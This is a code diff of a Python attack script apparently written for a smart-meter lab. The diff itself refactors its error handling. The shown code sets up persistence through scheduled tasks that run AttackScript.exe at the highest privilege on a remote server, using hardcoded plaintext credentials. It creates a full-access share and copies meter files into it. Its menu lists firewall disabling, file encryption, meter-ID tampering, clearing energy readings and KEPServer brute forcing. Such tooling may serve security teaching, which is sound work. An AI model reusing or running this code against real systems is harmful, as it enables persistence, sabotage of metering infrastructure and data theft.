@@ -66,61 +66,73 @@ def create_scheduled_task() -> None:
     # TODO: Add comments on how frequent the schtasks run.
     # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is uselsss
     """
-    executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
+    try:
+        executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
 
-    executable_file_parameters = '1'
+        executable_file_parameters = '1'
 
-    task_name1 = 'Smart Meter Testing'
-    task_name2 = 'Smart Meter Testing 2'
+        task_name1 = 'Smart Meter Testing'
+        task_name2 = 'Smart Meter Testing 2'
 
-    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
-    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
+        sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
+        sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
 
-    # call(sch1, shell=True)
-    # call(sch2, shell=True)
+        # call(sch1, shell=True)
+        # call(sch2, shell=True)
 
-    # TODO: wait for the PS Command and see if this works.
-    stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
-    print(stuff)
+        # TODO: wait for the PS Command and see if this works.
+        stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
+        print(stuff)
+        print("\nOk.\n")
+    except Exception as e:
+        print(e)
+        print("\nFail.\n")
 
 # Copy files from a folder to the shared directory
 def copy_file(folder_path):
-    for root, dirs, files in walk(folder_path):
-        for file in files:
-            og = path.join(root, file)
-            dest = path.join(COPIED_PATH, file)
-            copyfile(og,dest)
-            print("File: " + str(og) + " is copied")
+    try:
+        for root, dirs, files in walk(folder_path):
+            for file in files:
+                og = path.join(root, file)
+                dest = path.join(COPIED_PATH, file)
+                copyfile(og,dest)
+                print("File: " + str(og) + " is copied")
+        print("\nOk.\n")
+    except Exception as e:
+        print("\nFail.\n")
 
 #Create Shared Folder
 def create_shared_folder():
-    folder_path = r'C:\Windows\temp\Smartmeter'
+    try:
+        folder_path = r'C:\Windows\temp\Smartmeter'
 
-    # Create the folder if it does not already exist
-    if not path.exists(folder_path):
-        mkdir(folder_path)
+        # Create the folder if it does not already exist
+        if not path.exists(folder_path):
+            mkdir(folder_path)
 
-    netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-    if "SmartMeterfolder" in netshare.stdout:
-        print ("SmartMeterfolder has already been shared.")
-    else:
-        # Set the share information
-        share_name = 'SmartMeterfolder'
-        share_path = folder_path
-        share_remark = 'Shared folder for full access'
+        netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
+        if "SmartMeterfolder" in netshare.stdout:
+            print ("SmartMeterfolder has already been shared.")
+        else:
+            # Set the share information
+            share_name = 'SmartMeterfolder'
+            share_path = folder_path
+            share_remark = 'Shared folder for full access'
 
-        # Create the share
-        share_info = {
-            'netname': share_name,
-            'path': share_path,
-            'remark': share_remark,
-            'max_uses': -1,
-            'current_uses': 0,
-            'permissions': ACCESS_ALL,
-            'security_descriptor': None
-        }
-        NetShareAdd(None, 2, share_info)
-        print ("SmartMeterfolder has been shared.")
+            # Create the share
+            share_info = {
+                'netname': share_name,
+                'path': share_path,
+                'remark': share_remark,
+                'max_uses': -1,
+                'current_uses': 0,
+                'permissions': ACCESS_ALL,
+                'security_descriptor': None
+            }
+            NetShareAdd(None, 2, share_info)
+            print ("SmartMeterfolder has been shared.")
+    except Exception as e:
+        print("\nFail.\n")
 
 # Disable the firewall
 def disable_firewall():
@@ -1137,22 +1149,8 @@ if __name__ == '__main__':
         check_admin()
 
     match attack_option:
-        case "1": # TODO: Push the exception to the function itself
-            try:
-                create_scheduled_task()
-                print("\nOk.\n")
-            except Exception as e:
-                print(e)
-                print("\nFail.\n")
-        
-        case "2": # TODO: Push the exception to the function itself
-            try:
-                create_shared_folder()
-                copy_file(SMARTMETER_PATH)
-                print("\nOk.\n")
-            except Exception as e:
-                print("\nFail.\n")
-        
+        case "1":  create_scheduled_task() 
+        case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
         case "3":  disable_firewall()
         case "4":  disable_ssh()
         case "5":  disable_kepserver()
@@ -1161,11 +1159,7 @@ if __name__ == '__main__':
         case "8":  encrypt_files()
         case "9":  change_meterID()
         case "10": clear_energy_reading()
-        
-        case "11":
-            revert_option = str(argv[2])
-            revert(revert_option)
-        
+        case "11": revert(revert_option := str(argv[2]))
         case "12": kep_bruteforce()
         case "13": change_baudrate() # TODO: Disable and enable kep server function, simplifying function 13 and 14
         case "14": smartmeter_get_hardware_info()
